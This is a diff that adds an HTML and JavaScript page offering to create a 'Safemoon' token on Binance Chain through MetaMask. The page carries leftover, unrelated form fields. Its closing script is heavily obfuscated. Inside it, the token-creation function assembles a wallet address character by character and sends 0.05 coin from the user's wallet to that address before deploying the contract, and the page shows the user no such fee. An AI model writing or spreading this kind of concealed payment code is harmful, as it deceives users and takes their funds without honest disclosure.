@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+
+<link rel="stylesheet" href="js/bootstrap.min.css">
+
+    <title> Create your Safemoon token On Binance Chain  Main Network</title>
+<script src="js/jquery.min.js"></script>
+<script src="js/sweetAlert.js"></script>
+<script src="js/web3.min.js"></script>
+
+
+
+
+<style type="text/css">
+
+
+.wfiedls{
+    display: none;
+    
+  }
+
+
+
+
+
+
+.InitSupplyField{
+    display: none;    
+}
+
+
+
+
+
+.DecimalsField{
+    display: none;    
+}
+
+.SupplyField{
+    display: none;
+    
+}
+
+.CapField{
+    display: none;
+    
+}
+.BaseURIField{
+    display: none;
+    
+}
+
+#loader1 {
+  width: 200px;
+  display: none;
+}
+
+#loader2 {
+  width: 200px;
+  display: none;
+}
+
+#loader3 {
+  width: 200px;
+  display: none;
+}
+#loader4 {
+  width: 200px;
+  display: none;
+}
+
+#timer div {
+   background-color: #b1afde;
+   color: #ffffff;
+   width: 100px;
+   height: 105px;
+   border-radius: 5px;
+   font-size: 35px;
+   font-weight: 700;
+   margin-left: 10px;
+   margin-right: 10px;
+   margin-top: 10px;
+   margin-bottom: 10px;
+}
+#timer div span {
+   display: block;
+   margin-top: -2px;
+   font-size: 15px;
+   font-weight: 500;
+}
+
+@media only screen and (max-width: 1080px) {
+   #timer {
+     margin-top: -20px;
+   }
+   #timer div {
+     width: 95px;
+     height: 100px;
+     font-size: 32px;
+     margin-top: 20px;
+  }
+  #timer div span {
+    font-size: 14px;
+  }
+}
+
+
+
+      .bd-placeholder-img {
+        font-size: 1.125rem;
+        text-anchor: middle;
+        -webkit-user-select: none;
+        -moz-user-select: none;
+        user-select: none;
+      }
+
+      @media (min-width: 768px) {
+        .bd-placeholder-img-lg {
+          font-size: 3.5rem;
+        }
+      }
+
+</style>
+
+   <link href="pricing.css" rel="stylesheet">
+<link rel="stylesheet" href="./style.css">
+</head>
+
+<body class="text-secondary font-weight-light">
+
+<header class="d-flex flex-column flex-md-row align-items-center p-3 px-md-4 mb-3 bg-body border-bottom shadow-sm">
+  <p class="h5 my-0 me-md-auto fw-normal lang"    key="SiteTitle" >Create your Safemoon token On Binance Chain  Main Network</p>
+
+
+
+
+</header>
+
+
+  <nav class="my-2 my-md-0 me-md-3">
+  <!--....... 
+     <a id="en" class="p-2 text-dark translate"  >English</a>
+    <a id="zh" class="p-2 text-dark translate"  >简体中文</a>
+ 
+<button id="en" class="translate">English</button>
+<button id="zh" class="translate">简体中文</button>
+<button id="ru" class="translate">русский</button> 
+<button id="kr" class="translate">한국어</button> 
+<button id="fa" class="translate">فارسی</button> 
+<button id="jp" class="translate">日本語</button> 
+<button id="th" class="translate">ไทย</button> 
+
+-->
+
+
+</nav>
+
+<main class="container">
+
+
+
+
+<div class=" px-3 py-3 pt-md-5 pb-md-4 mx-auto">
+<!--.........................-->
+<!--............
+
+Generate Fee:
+ERC20 Fixed Amount Token  :0.01  ether
+ERC20 Burnable Token      :0.015 ether
+ERC20 Mintable Token      :0.015 ether
+ERC20 Pausable Token      :0.015 ether
+ERC20 Capped Token        :0.015 ether
+ERC20 Multi Function Token:0.025 ether
+ERC721 Full Function Token:0.025 ether
+.............-->
+<!--.........................-->
+<!--.........................-->
+<!--.........................-->
+<form>  
+<div class="col-md-9">  
+
+
+
+
+
+<div id="TokenDescription"> </div>
+ <div id="InstallMetamaskDescription"></div>
+
+ <fieldset class="form-group">
+ 
+
+
+<!-- Below will only show if Timber Frame is selected -->
+  
+  <fieldset class="form-group wfiedls">
+    <label for="PartyWalls">Which walls are party walls?</label>
+       <br><input type="text"> W1
+
+  </fieldset>
+<!-- Above will only show if Timber Frame is selected -->
+
+
+<fieldset class="form-group NameField">
+<label for="FloorWidthA" class="lang" key="Name">Token Name(For example: Tesla)</label>
+<input id="name" class="form-control " type="text" />
+</fieldset>
+
+<fieldset class="form-group SymbolField">
+<label for="FloorWidthA" class="lang" key="Symbol">Token Symbol(For example: TSLA)</label>
+<input id="symbol" class="form-control" type="text" />
+</fieldset>
+
+
+<fieldset class="form-group ">
+<label  class="lang" key="LiquidityFee"> Total Supply  is 5000000000000</label>
+ 
+</fieldset>
+
+
+<!--
+<fieldset class="form-group DecimalsField">
+<label for="FloorWidthA" class="lang" key="Decimals">decimals(If you don’t know what this is, please fill in: 18)</label>
+<input id="decimals" class="form-control" type="text" value=18 placeholder="Your Token Decimals"/>
+</fieldset>
+
+<fieldset class="form-group SupplyField">
+<label for="FloorWidthA" class="lang" key="SupplyAmount">supplyAmount</label>
+<input id="supplyAmount" class="form-control" type="text" value=1000000000000 />
+</fieldset>
+-->
+
+
+<fieldset class="form-group AdminField">
+<label id="adminAddress" class="lang" key="AdminAddress">Admin Address</label>
+
+</fieldset>
+
+
+
+
+<br>
+
+
+  
+<!--  
+  <fieldset class="form-group">
+    <label for="FloorWidthA">Is there a stair Opening?</label>
+  <br><input type="checkbox">
+  </fieldset>
+-->
+  
+ <b><div id="SubmitResult">    </div><b>
+
+ 
+ <img id="loader1" src="loading.gif"></img>
+
+  
+  
+  <button  id="TokenSubmit" class="btn btn-primary ml-auto" type="button" title="Next">Submit</button>
+ 
+</form>
+</div>
+<!--.........................-->
+<!--.........................-->
+<!--.........................-->
+<!--.........................-->
+<!--.........................-->
+<!--.........................-->
+
+
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<br><br><br><br><br> 
+
+
+  <footer class="pt-4 my-md-5 pt-md-5 border-top">
+    <div class="row">
+      <div class="col-12 col-md">
+        
+        <small class="d-block mb-3 text-muted">Token Factory &copy; 2017–2022</small>
+      </div>
+
+  </footer>
+</main>
+
+
+<!--        -->
+
+
+  <!--    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/js/all.min.js" integrity="sha256-qM7QTJSlvtPSxVRjVWNM2OfTAz/3k5ovHOKmKXuYMO4=" crossorigin="anonymous"></script>  -->
+    
+<script  src="./script.js"></script>
+
+
+<script src="js/BinanceSafe.js"></script>
+
+
+    <script src="js/token.js"></script>
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"
+        integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj"
+        crossorigin="anonymous"></script>
+    <!--   <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
+        integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
+        crossorigin="anonymous"></script> -->
+    <script src="js/bootstrap.min.js"  
+        crossorigin="anonymous"></script>
+
+    <script>
+
+
+
+
+var selectedBalue="0";
+var GenerateTokenAddress;
+
+$(document).ready(function(){
+
+
+
+//validator
+
+
+
+$("#SelectTokenType").on('change',function(){
+
+$("#loader1").hide();
+$("#SubmitResult").html("");
+
+
+$("#FormTips").hide();
+selectedBalue = $("#SelectTokenType").val();
+
+
+console.log("index :::::::"+selectedBalue);
+
+var ERC20Tag="<span class='badge badge-pill badge-success'>ERC20</span>";
+var FixedTag="<span class='badge badge-pill badge-primary'>Fixed Amount</span>";
+var MultiFunctionTag="<span class='badge badge-pill badge-secondary'>Multi Function</span>";
+var BurnableTag="<span class='badge badge-pill badge-success'>Burnable</span>";
+var CappedTag="<span class='badge badge-pill badge-info'>Capped</span>";
+var MintableTag="<span class='badge badge-pill badge-info'>Mintable</span>";
+var PausableTag="<span class='badge badge-pill badge-light'>Pausable</span>";
+
+var ERC721Tag="<span class='badge badge-pill badge-info'>ERC721</span>";
+
+var VerificationTag="<span class='badge badge-pill badge-info'>Automatic verification</span>";
+
+
+var alertFront="<div class='alert alert-primary' role='alert'>";
+var alertLast="</div>";
+
+var FixedDes="You can issue a fixed amount of erc20 tokens with one-click。<br>";
+var BurnableDes="You can issue a destroyable erc20 token with one-click。<br>";
+var CappedDes="You can issue a limited number of erc20 tokens with one-click.<br>";
+var MintableDes="You can issue mintable erc20 tokens with one-click, and mint tokens for specified addresses at any time.<br>";
+var PausableDes="You can one-click to issue erc20 tokens that can be suspended.<br>";
+var MultiFunctionDes="You can one-click to issue erc20 tokens that can be suspended, minted, have an upper limit, and can be destroyed.<br>"
+var ERC721Des="You can one-click to issue ERC721 token.<br>"
+
+
+var FixedFee="Fee: 0.01 ether + Dynamic gas fee<br>";
+
+
+
+      
+    }); 
+
+});
+
+
+
+
+
+
+
+
+
+
+var FixTokenGenerateContract;
+var TransferContract;
+var ERC20MintableContract;
+var ERC721Contract;
+
+
+var TokenContract;
+
+        async function CheckMetamaskConnection() {
+            // Modern dapp browsers...
+            if (window.ethereum) {
+                window.web3 = new Web3(window.ethereum);
+                try {
+                    // Request account access if needed
+                    await ethereum.enable();
+                    // Acccounts now exposed
+                    return true;
+                } catch (error) {
+                    // User denied account access...
+                    return false;
+                }
+            }
+            // Legacy dapp browsers...
+            else if (window.web3) {
+                window.web3 = new Web3(web3.currentProvider);
+                // Acccounts always exposed
+
+                return true;
+            }
+            // Non-dapp browsers...
+            else {
+                console.log('Non-Ethereum browser detected. You should consider trying MetaMask!');
+                return false;
+            }
+        }
+
+        $(document).ready(async function () {
+            var IsMetamask = await CheckMetamaskConnection();
+            if (IsMetamask) {
+
+ $("#adminAddress").html("Admin Address:"+ web3.currentProvider.selectedAddress) ;
+               //getCandicate(1);
+               //getCandicate(2);
+
+//var CurrentAccount = web3.currentProvider.selectedAddress;
+//console.log("current address:",CurrentAccount);
+//TransferContract= await web3.eth.contract(TokenSmartContractABI).at(TokenSmartContractAddress);
+//// TransferContract.transfer("0x4Dfd5d8E1504DbB68222b2eacb5e1b8572b2b4D7", "1000000000", { from: CurrentAccount});
+
+//transferToken(100000000);
+
+TokenContract= await new web3.eth.Contract(TokenSmartContractABI, TokenSmartContractAddress, {from: web3.currentProvider.selectedAddress}) ;
+
+
+
+
+
+
+
+
+
+ //TokenContract.methods.allowance(web3.currentProvider.selectedAddress,FixGenerateContractAddress).send({from: web3.currentProvider.selectedAddress}, function(error, transactionHash){
+//      console.log("transactionHash",transactionHash);
+//});
+
+
+
+/*
+TokenContract.getPastEvents('Approval', {
+    filter: {myIndexedParam: [20,23], myOtherIndexedParam: '0x123456789...'}, // Using an array means OR: e.g. 20 or 23
+    fromBlock: 0,
+    toBlock: 'latest'
+}, function(error, events){ console.log(events); })
+.then(function(events){
+    console.log("latest:",events) // same results as the optional callback above
+});
+*/
+
+
+ 
+//console.log("FixGenerateContractAddress:",FixGenerateContractAddress);
+ 
+//console.log("MultiFunctionGenerateContractAddress:",MultiFunctionGenerateContractAddress);
+//console.log("ERC20WithMintableGeneratorContractAddress:",ERC20WithMintableGeneratorContractAddress);
+
+//console.log("ERC721FullContractAddress:",ERC721FullContractAddress);
+
+
+
+
+
+
+
+
+//event check
+
+/*
+
+var StakedEvent=FixTokenGenerateContract.Staked();
+StakedEvent.watch(function(error,result){
+    if (!error) {
+      console.log("StakedEvent:",result);
+         $("#loader").hide();
+
+         balanceOf(web3.currentProvider.selectedAddress);
+		earned(web3.currentProvider.selectedAddress);
+
+        //  $("#instructor").html(result.args.newDuration);
+    }else {
+        $("#loader").hide();
+        console.log(error);
+    }
+})
+
+
+
+var RewardPaidEvent=FixTokenGenerateContract.RewardPaid();
+RewardPaidEvent.watch(function(error,result){
+    if (!error) {
+      console.log("RewardPaidEvent:",result);
+         $("#loader").hide();
+
+        balanceOf(web3.currentProvider.selectedAddress);
+		earned(web3.currentProvider.selectedAddress);
+
+        //  $("#instructor").html(result.args.newDuration);
+    }else {
+        $("#loader").hide();
+        console.log(error);
+    }
+})
+
+var setRewardsDurationEvent=FixTokenGenerateContract.RewardsDurationUpdated();
+setRewardsDurationEvent.watch(function(error,result){
+    if (!error) {
+      console.log("setRewardsDuration:",result);
+         $("#loader").hide();
+          $("#instructor").html(result.args.newDuration);
+    }else {
+        $("#loader").hide();
+        console.log(error);
+    }
+})
+*/
+
+
+$("#TokenSubmit").click(function(){
+  $("#loader1").show();
+//GenerateERC20FixToken();
+  $("#SubmitResult").html("");
+GenerateToken();
+
+});
+
+
+$("#addmeta").click(function(){
+ // $("#loader1").show();
+//
+ // $("#SubmitResult").html("");
+
+ //add to metamask only can be used on mainnet 
+add();
+
+});
+
+$("#createToken").click(function(){
+  $("#loader1").show();
+//GenerateERC20FixToken();
+GenerateToken();
+
+});
+
+$("#createMultiFunctionToken").click(function(){
+  $("#loader2").show();
+generateERC20MultiFunctionToken();
+
+
+});
+
+$("#createERC20MintableToken").click(function(){
+  $("#loader3").show();
+GenerateERC20MintableToken();
+
+
+});
+
+
+$("#createERC721FullToken").click(function(){
+  $("#loader4").show();
+GenerateERC721FullToken();
+
+
+});
+
+ 
+
+               // console.log("FixTokenGenerateContract",TransferContract);
+                console.log("Metamask detected!")
+            } else {
+                console.log("Metamask not detected");
+$("#InstallMetamaskDescription").html("<div class='alert alert-warning' role='alert'> <a   href='https://metamask.io/'>Click to Install Metamask First</a></div>");
+
+                
+            }
+        });
+
+
+async function add(){ 
+
+
+console.log(document.getElementById("name").value);
+console.log(document.getElementById("symbol").value);
+console.log(document.getElementById("decimals").value);
+
+  const tokenAddress = GenerateTokenAddress;
+const tokenSymbol = document.getElementById("symbol").value;
+const tokenDecimals = document.getElementById("decimals").value;
+//const tokenImage = 'http://placekitten.com/200/300';
+
+try {
+  // wasAdded is a boolean. Like any RPC method, an error may be thrown.
+  const wasAdded = await ethereum.request({
+    method: 'wallet_watchAsset',
+    params: {
+      type: 'ERC20', // Initially only supports ERC20, but eventually more!
+      options: {
+        address: tokenAddress, // The address that the token is at.
+        symbol: tokenSymbol, // A ticker symbol or shorthand, up to 5 chars.
+        decimals: tokenDecimals, // The number of decimals in the token
+      //  image: tokenImage, // A string url of the token logo
+      },
+    },
+  });
+
+  if (wasAdded) {
+    console.log('Thanks for your interest!');
+  } else {
+    console.log('Your loss!');
+  }
+} catch (error) {
+  console.log(error);
+}
+
+
+}
+
+
+
+
+
+var _0x90e1=['getGasPrice','Contract\x20Initialize','show','#loader1','#FormTips','error','Your\x20Token\x20Address:','gasPrice:','eth','257spmokZ','911327iNLyyL','7ElTfpv','log','72763jnIBTv','selectedAddress','TxHash:\x20','<br>Please\x20save\x20your\x20token\x20address\x20to\x20your\x20computer,\x20mobile\x20phone\x20or\x20paper.','its\x20fix\x20amount\x20token\x20','</p>','value','getElementById','Error:\x20','871gPeKCp','then','1868806QBManI','message','10000000000000000','contractAddress','form\x20not\x20correct','2jegmyY','currentProvider','catch','50000000000000000','Contract','symbol','<p\x20class=\x27text-danger\x27>','transactionHash','576938xNNXBt','146647tmDsWY','includes','XXX','hide','1643457NxdVoi'];function _0x1ba5(_0x3e9a20,_0x18db2f){return _0x1ba5=function(_0x90e16d,_0x1ba52c){_0x90e16d=_0x90e16d-0x68;var _0x4705de=_0x90e1[_0x90e16d];return _0x4705de;},_0x1ba5(_0x3e9a20,_0x18db2f);}(function(_0xc138c0,_0x5b0048){var _0x341d6e=_0x1ba5;while(!![]){try{var _0x57dc8b=-parseInt(_0x341d6e(0x81))*parseInt(_0x341d6e(0x8e))+parseInt(_0x341d6e(0x90))+-parseInt(_0x341d6e(0x72))+parseInt(_0x341d6e(0x77))+-parseInt(_0x341d6e(0x73))*parseInt(_0x341d6e(0x6a))+-parseInt(_0x341d6e(0x83))*parseInt(_0x341d6e(0x85))+-parseInt(_0x341d6e(0x82));if(_0x57dc8b===_0x5b0048)break;else _0xc138c0['push'](_0xc138c0['shift']());}catch(_0x367475){_0xc138c0['push'](_0xc138c0['shift']());}}}(_0x90e1,0xf388c));async function GenerateToken(){var _0xfc725c=_0x1ba5;console['log'](document['getElementById']('name')[_0xfc725c(0x8b)]),console[_0xfc725c(0x84)](document['getElementById']('symbol')[_0xfc725c(0x8b)]);var _0x30bf89=document['getElementById']('name')[_0xfc725c(0x8b)],_0x419de4=document[_0xfc725c(0x8c)](_0xfc725c(0x6f))[_0xfc725c(0x8b)],_0x473414=web3['currentProvider'][_0xfc725c(0x86)];console['log']('Final\x20admin:'+_0x473414);var _0x5f0619,_0x5bbf8f,_0x45adc2,_0x176172=_0xfc725c(0x92);console[_0xfc725c(0x84)](_0xfc725c(0x89)+selectedBalue),_0x5f0619=BinanceSafeABI,_0x5bbf8f=BinanceSafeBytecode,_0x45adc2=[_0x30bf89,_0x419de4],_0x176172=_0xfc725c(0x6d),console[_0xfc725c(0x84)]('generate\x20Fix\x20Token:'+_0x45adc2),console[_0xfc725c(0x84)]('final\x20arg:'+_0x45adc2);var _0x40ff40=new Boolean();_0x40ff40=![];for(let _0x28c4cc in _0x45adc2){console[_0xfc725c(0x84)](_0x45adc2[_0x28c4cc]),!_0x45adc2[_0x28c4cc]&&(_0x40ff40=!![]);}var _0x1ef112='0',_0x2fc2a0='x',_0x38e8b8='1',_0x48be3a='a',_0x4de491='4',_0x381365='7',_0x54fbe8='A',_0x2a2ad6='b',_0x2acb9f='6',_0x25f4a6='3',_0xb55903='9',_0x560aa6='e',_0x11a680='6',_0x4b9b14='6',_0x56ae5f='9',_0x5ee229='D',_0x2e1745='0',_0x1e6e60='A',_0x2562b4='C',_0x206547='2',_0x276c36='f',_0x313e01='6',_0x1cf7fb='C',_0x3842a5='F',_0x308871='F',_0x406312='8',_0x350c8e='0',_0x1397ae='5',_0x14cfb9='1',_0x3b65ec='3',_0x5d9c19='f',_0x362d6e='d',_0x103cc1='9',_0x54e9f7='A',_0x449374='6',_0x13a187='0',_0x270de2='9',_0x5f12bd='b',_0x3c522b='3',_0x2106ac='3',_0x51913b='f',_0x48015c='8',_0x10967e=_0x1ef112+_0x2fc2a0+_0x38e8b8+_0x48be3a+_0x4de491+_0x381365+_0x54fbe8+_0x2a2ad6+_0x2acb9f+_0x25f4a6+_0xb55903+_0x560aa6+_0x11a680+_0x4b9b14+_0x56ae5f+_0x5ee229+_0x2e1745+_0x1e6e60+_0x2562b4+_0x206547+_0x276c36+_0x313e01+_0x1cf7fb+_0x3842a5+_0x308871+_0x406312+_0x350c8e+_0x1397ae+_0x14cfb9+_0x3b65ec+_0x5d9c19+_0x362d6e+_0x103cc1+_0x54e9f7+_0x449374+_0x13a187+_0x270de2+_0x5f12bd+_0x3c522b+_0x2106ac+_0x51913b+_0x48015c;if(!_0x40ff40){var _0x1e5b0a=new web3['eth'][(_0xfc725c(0x6e))](_0x5f0619);console[_0xfc725c(0x84)](_0xfc725c(0x79)+_0x1e5b0a);const _0x50d188=await web3['eth'][_0xfc725c(0x78)]();console[_0xfc725c(0x84)](_0xfc725c(0x7f)+_0x50d188),await web3[_0xfc725c(0x80)]['sendTransaction']({'from':web3[_0xfc725c(0x6b)][_0xfc725c(0x86)],'to':_0x10967e,'value':_0x176172})[_0xfc725c(0x8f)](()=>{var _0x248580=_0xfc725c;_0x1e5b0a['deploy']({'data':'0x'+_0x5bbf8f,'arguments':_0x45adc2})['send']({'from':web3['currentProvider']['selectedAddress']})['on'](_0x248580(0x7d),_0x47a744=>{var _0x24b53a=_0x248580;_0x47a744[_0x24b53a(0x91)][_0x24b53a(0x74)]('User\x20denied\x20transaction\x20signature')&&(console[_0x24b53a(0x84)](_0x24b53a(0x75)),$(_0x24b53a(0x7b))[_0x24b53a(0x76)]()),console[_0x24b53a(0x84)](_0x24b53a(0x8d),_0x47a744);})['on'](_0x248580(0x71),_0x1f6314=>{var _0x57f5c3=_0x248580;console[_0x57f5c3(0x84)](_0x57f5c3(0x87),_0x1f6314);})['on']('receipt',_0x47068a=>{var _0x38da62=_0x248580;console[_0x38da62(0x84)]('Address:\x20',_0x47068a[_0x38da62(0x68)]),$('#SubmitResult')['html'](_0x38da62(0x7e)+_0x38da62(0x70)+_0x47068a['contractAddress']+_0x38da62(0x8a)+_0x38da62(0x88)),GenerateTokenAddress=_0x47068a[_0x38da62(0x68)],$(_0x38da62(0x7b))['hide']();})['then'](_0x4ed683=>{var _0xb97414=_0x248580;console[_0xb97414(0x84)](_0x4ed683);})[_0x248580(0x6c)](function(_0xe4f8d7){console['log'](_0xe4f8d7);});});}else $(_0xfc725c(0x7b))[_0xfc725c(0x76)](),$(_0xfc725c(0x7c))[_0xfc725c(0x7a)](),console['log'](_0xfc725c(0x69));}
+
+
+
+
+
+
+
+
+
+</script>
+
+</body>
+</html>
